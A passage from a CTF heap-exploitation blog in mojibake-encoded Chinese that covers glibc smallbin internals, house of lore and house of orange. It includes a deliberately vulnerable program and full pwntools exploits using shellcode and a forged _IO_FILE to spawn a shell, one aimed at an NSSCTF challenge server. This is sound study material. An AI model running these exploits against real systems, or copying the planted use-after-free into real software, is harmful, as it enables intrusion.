bin.  Since these &quot;smallbins&quot;       hold one size each, no searching within bins is necessary.       (For a large request, we need to wait until unsorted chunks are       processed to find best fit. But for small ones, fits are exact       anyway, so we can check now, which is faster.)     */    if (in_smallbin_range(nb)) &#123;        // è·å– small bin çš„ç´¢å¼•        idx = smallbin_index(nb);        // è·å–å¯¹åº” small bin ä¸­çš„ chunk æŒ‡é’ˆ        bin = bin_at(av, idx);        // å…ˆæ‰§è¡Œ victim= last(bin)ï¼Œè·å– small bin çš„æœ€åä¸€ä¸ª chunk        // å¦‚æœ victim = bin ï¼Œé‚£è¯´æ˜è¯¥ bin ä¸ºç©ºã€‚        // å¦‚æœä¸ç›¸ç­‰ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸¤ç§æƒ…å†µ        if ((victim = last(bin)) != bin) &#123;            // ç¬¬ä¸€ç§æƒ…å†µï¼Œsmall bin è¿˜æ²¡æœ‰åˆå§‹åŒ–ã€‚            if (victim == 0) /* initialization check */                // æ‰§è¡Œåˆå§‹åŒ–ï¼Œå°† fast bins ä¸­çš„ chunk è¿›è¡Œåˆå¹¶                malloc_consolidate(av);            // ç¬¬äºŒç§æƒ…å†µï¼Œsmall bin ä¸­å­˜åœ¨ç©ºé—²çš„ chunk            else &#123;                // è·å– small bin ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚                bck = victim-&gt;bk;                // æ£€æŸ¥ bck-&gt;fd æ˜¯ä¸æ˜¯ victimï¼Œé˜²æ­¢ä¼ªé€                 if (__glibc_unlikely(bck-&gt;fd != victim)) &#123;                    errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                    goto errout;                &#125;                // è®¾ç½® victim å¯¹åº”çš„ inuse ä½                set_inuse_bit_at_offset(victim, nb);                // ä¿®æ”¹ small bin é“¾è¡¨ï¼Œå°† small bin çš„æœ€åä¸€ä¸ª chunk å–å‡ºæ¥                bin-&gt;bk = bck;                bck-&gt;fd = bin;                // å¦‚æœä¸æ˜¯ main_arenaï¼Œè®¾ç½®å¯¹åº”çš„æ ‡å¿—                if (av != &amp;main_arena) set_non_main_arena(victim);                // ç»†è‡´çš„æ£€æŸ¥                check_malloced_chunk(av, victim, nb);                // å°†ç”³è¯·åˆ°çš„ chunk è½¬åŒ–ä¸ºå¯¹åº”çš„ mem çŠ¶æ€                void *p = chunk2mem(victim);                // å¦‚æœè®¾ç½®äº† perturb_type , åˆ™å°†è·å–åˆ°çš„chunkåˆå§‹åŒ–ä¸º perturb_type ^ 0xff                alloc_perturb(p, bytes);                return p;            &#125;        &#125;    &#125;\nè¿™æ®µç¨‹åºæ¥è‡ªhow2heapçš„house_of_lore,(glibc-2.27 version)å±•ç¤ºäº†unsortedbinçš„house of lore\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; \tfprintf(stderr, &quot;Nice jump d00d\\n&quot;); \texit(0); &#125;int main(int argc, char * argv[])&#123;   intptr_t *victim = malloc(0x100);  void *dummies[7];  for(int i=0; i&lt;7; i++) dummies[i] = malloc(0x100);//å…ˆå¡«æ»¡tache   // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk  intptr_t *victim_chunk = victim-2;  intptr_t* stack_buffer_1[4] = &#123;0&#125;;  intptr_t* stack_buffer_2[4] = &#123;0&#125;;  void* fake_freelist[7][4];  for(int i=0; i&lt;6; i++) &#123;    fake_freelist[i][3] = fake_freelist[i+1];  &#125;  fake_freelist[6][3] = NULL;//åœ¨æ ˆä¸Šä¼ªé€ ä¸€æ®µfake_free_listï¼Œæ¥éª—    stack_buffer_1[0] = 0;  stack_buffer_1[1] = 0;  stack_buffer_1[2] = victim_chunk;//ç»•è¿‡smallbinçš„æ£€æŸ¥   stack_buffer_1[3] = (intptr_t*)stack_buffer_2;//ç»•è¿‡smallbinæ£€æŸ¥   stack_buffer_2[2] = (intptr_t*)stack_buffer_1;  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];//é˜²æ­¢crash     void *p5 = malloc(1000);//é˜²æ­¢åˆå¹¶   for(int i=0; i&lt;7; i++) free(dummies[i]);  free((void*)victim);//freeè¿›unsortedbin   fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);//æ­¤æ—¶æ ¹æ®é¦–ä¸ªunsortedbinçš„ç‰¹æ€§ï¼Œè¯¥chunkçš„fdå’ŒbkæŒ‡é’ˆå°†ä¼šæŒ‡å‘libc   void *p2 = malloc(1200);//ç”³è¯·ä¸€ä¸ªsmallbinå’Œunsortedbinçš„éƒ½æ— æ³•æ»¡è¶³å…¶å¤§å°çš„å †å—   //æ­¤æ—¶ï¼Œæˆ‘ä»¬åŸæœ¬çš„ç”³è¯·çš„victimå°±ä¼šè¢«æ’å…¥åˆ°smallbinçš„å‰é¢   //è€Œä¸”å®ƒçš„fdå’Œbkæ›´æ–°      fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  //------------VULNERABILITY-----------  //æ¨¡æ‹ŸUAFç¯¡æ”¹victimçš„è¿‡ç¨‹   victim[1] = (intptr_t)stack_buffer_1;   //------------------------------------  for(int i=0; i&lt;7; i++) malloc(0x100);//æ¸…ç©ºtache   void *p3 = malloc(0x100);//æ¥éª—ï¼  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n&quot;);  char *p4 = malloc(0x100);// æ¥å·è¢­ï¼ chunk2stack   fprintf(stderr, &quot;\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n&quot;,stack_buffer_2[2]);  fprintf(stderr, &quot;\\np4 is %p and should be on the stack!\\n&quot;, p4);   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode  //  long offset = (long)__builtin_frame_address(0) - (long)p4;  memcpy((p4+offset+8), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary  // sanity check  assert((long)__builtin_return_address(0) == (long)jackpot);&#125;\n\nå†™äº†ä¸ªå°æ–‡ä»¶,å‡ ä¹å•¥æ¼æ´éƒ½èƒ½æ‰“ï¼ˆ\n//gcc lore.c -g  -o lore //gcc 2heap.c -g -no-pie -no-stack-protector -o heap2stack #include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];void init()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123;    puts(&quot;what u want to do next?&quot;);    puts(&quot;1. Build a house&quot;);\tputs(&quot;2. Delete a house&quot;);\tputs(&quot;3. Edit your house&quot;);\tputs(&quot;4. Show your house&quot;);    puts(&quot;5. Exit&quot;);    puts(&quot;6. Magic&quot;);    puts(&quot;&gt;&quot;);&#125;void add()&#123;    char size[20];    if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123;        if(!chunk_ptr[chunk_time])&#123;        printf(&quot;You have built %d houses in my world\\n&quot;,chunk_time);        puts(&quot;You can customize the size of house here, but what about your life&quot;);        read(0,size,0x8);        chunk_size[chunk_time] = atoi(size);\t\tchunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]);\t\tputs(&quot;add something to your house&quot;);        read(0,chunk_ptr[chunk_time],chunk_size[chunk_time]);        chunk_time++;        &#125;else&#123;            puts(&quot;something wrong,but you can come in any time&quot;);            exit(0);        &#125;    &#125;else&#123;                puts(&quot;something wrong,but you can come in any time&quot;);        exit(0);    &#125;&#125;void delete()&#123;    int index;    puts(&quot;I won&#x27;t set the pointer to zero&quot;);    puts(&quot;every decision you made is meaningful&quot;);    scanf(&quot;%d&quot;,&amp;index);    free(chunk_ptr[index]);&#125;void edit()&#123;    int index;    puts(&quot;something wrong?&quot;);    puts(&quot;It&#x27;s never too late to make changes&quot;);    scanf(&quot;%d&quot;,&amp;index);    puts(&quot;something interesting here&quot;);    read(0,&amp;chunk_size[index],0x8);    puts(&quot;Nice choice!&quot;);    puts(&quot;Now add something&quot;);    read(0,chunk_ptr[index],chunk_size[index]);    puts(&quot;ok\\n&quot;);&#125;void show()&#123;    puts(&quot;Nothing is perfect,but you can make something different&quot;);    puts(&quot;Let&#x27;s see what you can do&quot;);    int index;    scanf(&quot;%d&quot;,&amp;index);    puts(chunk_ptr[index]);&#125;int main()&#123;    int choice;    init();    puts(&quot;This program is used to explore something about&quot;);    puts(&quot;\t **  ** ******    **    ******  **&quot;);\tputs(&quot;\t**__** **__     ****   **__**  **&quot;);\tputs(&quot; **  ** **      **__**  *****   **&quot;);\tputs(&quot;**  ** ****** ******** **      __&quot;);    puts(&quot;written by str1k3&quot;);    puts(&quot;input you passwd:&quot;);    mmap((void*)0xACE00000,0x1200ull,7,33,-1,0ll);    read(0,(void*)0xACE00000,0x233);    puts(&quot;Welcome to my world!&quot;);    puts(&quot;In my world,you can build up some houses&quot;);    mmap((void*)0xbad00000,0x120ull,7,33,-1,0ll);    while(1)&#123;        menu();        scanf(&quot;%d&quot;,&amp;choice);        switch(choice)&#123;            case 1:                add();                break;            case 2:                delete();                break;            case 3:                edit();                break;            case 4:                show();                break;            case 5:                puts(&quot;ready to exit?&quot;);                puts(&quot;back to your life!&quot;);                exit(0);                break;            case 6:                puts(&quot;Use your force! CTFer&quot;);                read(0,(void*)0xbad00000,0x66);        &#125;    &#125;&#125;\n\nâ”Œâ”€â”€(str1d3rã‰¿str1k3Gwindows)-[~/æ¡Œé¢/Desktop]â””â”€$ checksec lore[*] &#x27;/mnt/Desktop/lore&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n\nfrom pwn import*from pwn import p64,u64p = process(&quot;./lore&quot;)elf = ELF(&quot;./lore&quot;)#libc = ELF(&quot;./libc-2.27.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def add(magic,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;say a magic word before your build&quot;)    p.sendline(str(magic))    p.recvuntil(b&quot;You can customize the size of house here, but what about your life&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;add something to your house\\n&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;every decision you made is meaningful&#x27;)    p.sendline(str(index))def edit(index,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;It&#x27;s never too late to make changes&quot;)    p.sendline(str(index))    p.recvuntil(b&quot;something interesting here&quot;)    p.sendline(str(size))    p.sendlineafter(b&quot;Now add something&quot;,payload)def show(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))def exit():    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;5&#x27;)def magic(magic):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;6&#x27;)    p.recvuntil(b&quot;Use your force! CTFer&quot;)    p.sendline(str(magic))orw = b&quot;\\x90&quot; * 0x100orw  += asm(shellcraft.open(&quot;/flag&quot;))orw  += asm(shellcraft.read(3, 0xACE00500, 0x500))orw  += asm(shellcraft.write(1, 0xACE00500, 0x500))orw_addr = 0xACE00500stack_buffer_addr = 0xbad00000p.recvuntil(b&#x27;passwd:&#x27;)p.sendline(orw)add(0x100,b&#x27;aaaa&#x27;)#victimadd(0x100,b&#x27;aaaa&#x27;)delete(0)delete(1)show(1)victim =u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))success(&quot;chunk0_addr:%s&quot;,hex(victim))#stack_buffer_1-&gt;fd=stack_buffer_1[2]=victimstack_buff = p64(0) +p64(0x500)stack_buff += p64(stack_buffer_addr)stack_buff +=p64(victim)magic(stack_buff)add(0x100,b&#x27;aaaa&#x27;)#victimfor i in range(7):    add(0x100,b&#x27;bbbb&#x27;)#tcacheadd(1000,b&#x27;cccc&#x27;)for i in range(7):    delete(i+1)add(1200,b&#x27;dddd&#x27;)delete(0)edit(0,0x100,p64(0)+p64(stack_buffer_addr))for i in range(7):    add(0x100,b&#x27;aaaa&#x27;)#tcacheadd(0x100,b&#x27;aaaa&#x27;)add(0x100,p64(0)+p64(orw_addr))\n\n\n","categories":["heap"],"tags":["bin"]},{"title":"house_of_orange","url":"/2023/10/01/house-of-orange/","content":"house of orange\næˆ‘ä»¬åœ¨æ‰“House of Forceä¸­ä½¿ç”¨çš„æ–¹æ³•æ˜¯ä¿®æ”¹Top_chunkä¸ºä¸€ä¸ªç‰¹åˆ«å¤§çš„å€¼æ¥æ‹¿æTop_chunkï¼Œä¹‹åç”³è¯·ä¸€ä¸ªç‰¹åˆ«å¤§çš„chunkï¼Œå¾ªç¯ä¸€éå†…å­˜ä¹‹åå°±å¯ä»¥è®¿é—®åˆ°åŸæœ¬Top_chunkä¸Šæ–¹çš„å†…å®¹\né‚£å¦‚æœå°†Top_chunkä¿®æ”¹ä¸ºä¸€ä¸ªå¾ˆå°çš„å€¼å‘¢ï¼Ÿ\nmallocåˆ†é…å†…å­˜çš„æ—¶å€™å®é™…ä¸Šæ›´åº•å±‚æ˜¯é€šè¿‡sbrkçš„è°ƒç”¨æ‹“å±•å†…å­˜çš„ç©ºé—´çš„å‡å¦‚æˆ‘ä»¬æŠŠTop_chunkä¿®æ”¹ä¸ºä¸€ä¸ªå¾ˆå°çš„æ•°ï¼Œè¿™æ—¶å†ç”³è¯·ä¸€ä¸ªæ›´å¤§çš„chunkå†…å­˜è®¤ä¸ºçš„Top_chunkæ˜¯æ— æ³•æ»¡è¶³ç”³è¯·ç©ºé—´çš„éœ€æ±‚çš„ï¼Œå› æ­¤å †ç®¡ç†å™¨åç»­ä¼šå†ä½¿ç”¨brkç”³è¯·ä¸€å—æ–°çš„åŒºåŸŸ\næ­£å¸¸æ¥è¯´å †ç®¡ç†å™¨ä¼šç›´æ¥å°†é€šè¿‡brkåˆ†é…çš„æ–°å†…å­˜ç›´æ¥å¹¶å…¥åˆ°Top_chunkä¸­ï¼ˆå³è®©Top_chunkå˜å¤§ï¼‰ä½†æ˜¯ç”±äºæˆ‘ä»¬æ”¹å°äº†Top_chunkï¼Œå †ç®¡ç†å™¨è®¤ä¸ºTop_chunkä¸å †çš„å°¾éƒ¨å¹¶ä¸ç›¸é‚»\nå› æ­¤ä¼šå°†åŸæœ¬çš„Top_chunk Freeæ‰\nè¿™æ ·ä¸€ç•ªè¿‡ç¨‹ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±æ²¡æœ‰é€šè¿‡Freeå‡½æ•°å¾—åˆ°äº†ä¸€ä¸ªFree chunkæ ¹æ®ä¿®æ”¹çš„Top Chunkå¤§å°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªFree Chunkæ¥å®ç°Unsorted bin attack\nåˆ©ç”¨Unsorted bin attackç»“åˆä¼ªé€ IO_fileå°±å¯ä»¥åŠ«æŒç¨‹åºæ‰§è¡Œæµ\néœ€è¦ä¼ªé€ çš„æ˜¯è¿™æ®µ,ç›®æ ‡æ˜¯è§¦å‘_overflowå‡½æ•°\npwndbg&gt; dt FILEFILE    +0x0000 _flags               : int    +0x0008 _IO_read_ptr         : char *    +0x0010 _IO_read_end         : char *    +0x0018 _IO_read_base        : char *    +0x0020 _IO_write_base       : char *    +0x0028 _IO_write_ptr        : char *    +0x0030 _IO_write_end        : char *    +0x0038 _IO_buf_base         : char *    +0x0040 _IO_buf_end          : char *    +0x0048 _IO_save_base        : char *    +0x0050 _IO_backup_base      : char *    +0x0058 _IO_save_end         : char *    +0x0060 _markers             : struct _IO_marker *    +0x0068 _chain               : struct _IO_FILE *    +0x0070 _fileno              : int    +0x0074 _flags2              : int    +0x0078 _old_offset          : __off_t    +0x0080 _cur_column          : short unsigned int    +0x0082 _vtable_offset       : signed char    +0x0083 _shortbuf            : char [1]    +0x0088 _lock                : _IO_lock_t *    +0x0090 _offset              : __off64_t    +0x0098 _codecvt             : struct _IO_codecvt *    +0x00a0 _wide_data           : struct _IO_wide_data *    +0x00a8 _freeres_list        : struct _IO_FILE *    +0x00b0 _freeres_buf         : void *    +0x00b8 __pad5               : size_t    +0x00c0 _mode                : int    +0x00c4 _unused2             : char [20]\npwndbg&gt; p *_IO_list_all$1 = &#123;  file = &#123;    _flags = -72540025,     _IO_read_ptr = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_read_end = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_read_base = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_write_base = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_write_ptr = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_write_end = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_buf_base = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_buf_end = 0x7f0b81d6d704 &lt;_IO_2_1_stderr_+132&gt; &quot;&quot;,     _IO_save_base = 0x0,     _IO_backup_base = 0x0,     _IO_save_end = 0x0,     _markers = 0x0,     _chain = 0x7f0b81d6d760 &lt;_IO_2_1_stdout_&gt;,     _fileno = 2,     _flags2 = 0,     _old_offset = -1,     _cur_column = 0,     _vtable_offset = 0 &#x27;\\000&#x27;,     _shortbuf = &quot;&quot;,     _lock = 0x7f0b81d6e8b0 &lt;_IO_stdfile_2_lock&gt;,     _offset = -1,     _codecvt = 0x0,     _wide_data = 0x7f0b81d6c780 &lt;_IO_wide_data_2&gt;,     _freeres_list = 0x0,     _freeres_buf = 0x0,     __pad5 = 0,     _mode = 0,     _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt;  &#125;,   vtable = 0x7f0b81d692a0 &lt;_IO_file_jumps&gt;&#125;\nè¿˜æ˜¯æ”¾æ®µæºç å§\nstruct _IO_FILE &#123;int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags   /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;   /* Current read pointer */  char* _IO_read_end;   /* End of get area. */  char* _IO_read_base;  /* Start of putback+get area. */  char* _IO_write_base; /* Start of put area. */  char* _IO_write_ptr;  /* Current put pointer. */  char* _IO_write_end;  /* End of put area. */  char* _IO_buf_base;   /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */   struct _IO_marker *_markers;   struct _IO_FILE *_chain;   int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */ #define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1]; /*  char* _save_gptr;  char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;\nå¯ä»¥æŒ‰ç…§å¦‚ä¸‹ä¼ªé€ \n#house of orange#æ‰§è¡Œvtableçš„å‡½æ•°æ—¶ï¼ŒFILEç»“æ„ä½“åœ°å€è¢«ä½œä¸ºå‚æ•°ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬åœ¨æœ€å¼€å¤´å†™/bin/shå­—ç¬¦ä¸²  fake_file = b&#x27;/bin/sh\\x00&#x27; #flags,ä¹Ÿæ˜¯æœ€å__overflowè°ƒç”¨çš„å‚æ•°fake_file += p64(0x61)     #sizeä¸º0x61ï¼Œè¢«æ”¾å…¥small_binï¼Œä»è€Œå¯¹åº”äº†chainæŒ‡é’ˆfake_file += p64(0) + p64(io_list_all - 0x10)#unsorted bin attackï¼Œä¿®æ”¹_IO_list_allä¸ºmain_arena+88fake_file += p64(0) + p64(1)  #_IO_write_base &lt; _IO_write_ptrfake_file += b&#x27;\\x00&#x27;*0x90     #å¡«å……ä¸­é—´(ä»_IO_write_endååˆ°_mode)ï¼ˆå¯¹åˆ©ç”¨ï¼‰æ— ç”¨çš„æ•°æ®fake_file += p64(0)       #_mode &lt;= 0fake_file += b&#x27;\\x00&#x27;*0x10 #_unused2 fake_file += p64(heap_base + 0x120)   #the offset byte of vtablefake_file += p64(0)*3 fake_file += p64(system)#__overflow payload = b&#x27;a&#x27;*0x10 payload += fake_file\næ³¨æ„è¯¥æ”»å‡»æ‰‹æ®µä»…é€‚ç”¨äº2.23åŠ2.23ä»¥å‰,ä½†æ˜¯å…¶åœ¨æ— freeçš„æƒ…å†µä¸‹é€ æˆfreeçš„æ‰‹æ®µå¯ä»¥ä½¿ç”¨æ¥çœ‹ä¸ªä¾‹é¢˜å§[SWPUCTF 2021 æ–°ç”Ÿèµ›]NSS_printer_IIchecksec\nâ””â”€$ checksec printer[*] &#x27;/mnt/Desktop/printer&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nmainå‡½æ•°å†…å­˜åœ¨ä¸€æ¬¡baseç¼–ç ï¼Œå…·ä½“ä¸èµ˜è¿°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥æ³„éœ²libcå’Œheapåªæœ‰å¢ï¼Œåˆ æ”¹æŸ¥éƒ½æ²¡æœ‰\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3; // [rsp+8h] [rbp-E8h]  unsigned int size; // [rsp+Ch] [rbp-E4h]  char *format; // [rsp+18h] [rbp-D8h]  char s1[32]; // [rsp+20h] [rbp-D0h] BYREF  char v7[32]; // [rsp+40h] [rbp-B0h] BYREF  char v8[136]; // [rsp+60h] [rbp-90h] BYREF  unsigned __int64 v9; // [rsp+E8h] [rbp-8h]  v9 = __readfsqword(0x28u);  init(argc, argv, envp);  v3 = 0;  while ( 1 )  &#123;    do    &#123;      printf(&quot;username = &quot;);      gets(s1);      printf(&quot;password = &quot;);      gets(v7);      ++v3;      base64_encode(v7, (__int64)v8);    &#125;    while ( strcmp(s1, &quot;NSSCTF&quot;) );    if ( !strcmp(v8, &quot;Z=FZJhKU5jPQ3jC65I86F0Kb&quot;) )    &#123;      puts(&quot;Hello, welcome to NSS printer&quot;);      while ( 1 )      &#123;        printf(&quot;lens of your word: &quot;);        size = read_num();        if ( size &gt; 0x1000 )          break;        format = (char *)malloc(size);        printf(&quot;input what you want to say: &quot;);        gets(format);        printf(&quot;you said: &quot;);        printf(format);        putchar(10);      &#125;      puts(&quot;too long&quot;);      exit(1);    &#125;  &#125;&#125;\néš¾ç‚¹å°±æ˜¯å¦‚ä½•åœ¨æ²¡æœ‰freeçš„æƒ…å†µä¸‹freeæ‰ä¸€ä¸ªchunkï¼Œä½¿å…¶è¿›å…¥unsortedbinï¼Œä»¥å®Œæˆç¨åçš„åˆ©ç”¨\nfrom pwn import *from LibcSearcher import*from ctypes import *from struct import packcontext(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()#p = process([&quot;./printer&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)p = remote(&#x27;node5.anna.nssctf.cn&#x27;, 29000)p.sendlineafter(&quot;username = &quot;, &quot;NSSCTF\\x00&quot;)p.sendlineafter(&quot;password = &quot;, &quot;NSSCTF&#123;b@se_xx_64&#125;\\x00&quot;)def attack(size, content):    p.sendlineafter(&quot;word: &quot;, str(size))    p.sendlineafter(&quot;say: &quot;, content)pl = b&#x27;%37$p.%33$p.%9$p&#x27; + p64(0) + p64(0xfe1)attack(0x10, pl)#fmtp.recvuntil(&#x27;0x&#x27;)libc_start_main_addr = int((p.recv(12)),16) - 240p.recvuntil(&#x27;0x&#x27;)pro_base = int((p.recv(12)),16) - 0xa10p.recvuntil(&#x27;0x&#x27;)heap_base = int((p.recv(12)),16) - 0x10libc = ELF(&#x27;./libc.so.6&#x27;) #2.23-0ubuntu11.3_amd64libc_base = libc_start_main_addr - libc.sym[&#x27;__libc_start_main&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]io_list_all = libc_base + libc.sym[&#x27;_IO_list_all&#x27;]success(&quot;libc:%s&quot;,hex(libc_base))success(&quot;system:%s&quot;,hex(system))success(&quot;heap_base:%s&quot;,hex(heap_base))#--------house of orange--------#debug()attack(0x1000, b&#x27;aaaaa&#x27;) #----- ä¿®æ”¹Top Chunkå¾—åˆ°ä¸€ä¸ªFree chunk ##æœ¬åœ°debugè¿‡ä¸å»ï¼Œä½†æ˜¯idaåç¼–è¯‘å’Œé¶æœºç¯å¢ƒéƒ½å¯ä»¥ç”³è¯·åˆ°0x1000çš„chunk#æ‰§è¡Œvtableçš„å‡½æ•°æ—¶ï¼ŒFILEç»“æ„ä½“åœ°å€è¢«ä½œä¸ºå‚æ•°ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬åœ¨æœ€å¼€å¤´å†™/bin/shå­—ç¬¦ä¸²  fake_file = b&#x27;/bin/sh\\x00&#x27; #flags,ä¹Ÿæ˜¯æœ€å__overflowè°ƒç”¨çš„å‚æ•°fake_file += p64(0x61)  #sizeä½œä¸º0x61ï¼Œè¢«æ”¾å…¥small_binï¼Œä»è€Œå¯¹åº”äº†chainæŒ‡é’ˆfake_file += p64(0) + p64(io_list_all - 0x10)#unsorted bin attackï¼Œä¿®æ”¹_IO_list_allä¸ºmain_arena+88fake_file += p64(0) + p64(1)  #_IO_write_base &lt; _IO_write_ptrfake_file += b&#x27;\\x00&#x27;*0x90     #å¡«å……ä¸­é—´(ä»_IO_write_endååˆ°_mode)ï¼ˆå¯¹åˆ©ç”¨ï¼‰æ— ç”¨çš„æ•°æ®fake_file += p64(0)       #_mode &lt;= 0fake_file += b&#x27;\\x00&#x27;*0x10 #_unused2 fake_file += p64(heap_base + 0x120)   #the offset byte of vtablefake_file += p64(0)*3 fake_file += p64(system)#__overflow payload = b&#x27;a&#x27;*0x10 payload += fake_fileattack(0x10, payload)p.sendlineafter(&quot;word: &quot;, str(0x10))p.interactive()\næŠ¥äº†ä¸€å †é”™ï¼Œä½†æ˜¯å¼¹äº†ä¸€ä¸ªshelléœ€è¦å¤šæ‰“å‡ æ¬¡\n[DEBUG] Received 0x4b bytes:    b&quot;*** Error in `./pwn5&#x27;: malloc(): memory corruption: 0x00007f3d936e6520 ***\\n&quot;*** Error in `./pwn5&#x27;: malloc(): memory corruption: 0x00007f3d936e6520 ***[DEBUG] Received 0x178 bytes:    b&#x27;======= Backtrace: =========\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f3d933987f5]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x8215e)[0x7f3d933a315e]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3d933a51d4]\\n&#x27;    b&#x27;./pwn5(+0xfc0)[0x55dc9c804fc0]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3d93341840]\\n&#x27;    b&#x27;./pwn5(+0xa39)[0x55dc9c804a39]\\n&#x27;    b&#x27;======= Memory map: ========\\n&#x27;======= Backtrace: =========/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f3d933987f5]/lib/x86_64-linux-gnu/libc.so.6(+0x8215e)[0x7f3d933a315e]/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3d933a51d4]./pwn5(+0xfc0)[0x55dc9c804fc0]/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3d93341840]./pwn5(+0xa39)[0x55dc9c804a39]======= Memory map: ========$\n\nç¬¬ä¸€æ¬¡å¤ç°å¦‚æ­¤å·§å¦™çš„æ”»å‡»æ‰‹æ³•ï¼Œå–µå–µå–µå‰é¢çš„ä¾‹é¢˜ï¼Œä»¥åå†æ¥æ¢ç´¢å§\n","categories":["heap"],"tags":["_IO_FILE"]},{"title":"house_of_muney","url":"/2024/05/17/house-of-muney/","content":"[å‰ç½®][glibcæºç è°ƒè¯•]è¯¥æ‰‹æ®µéœ€é…åˆglibcçš„æºç åˆ†æï¼Œå…ˆå­˜ä¸€ä¸ªglibcæºç 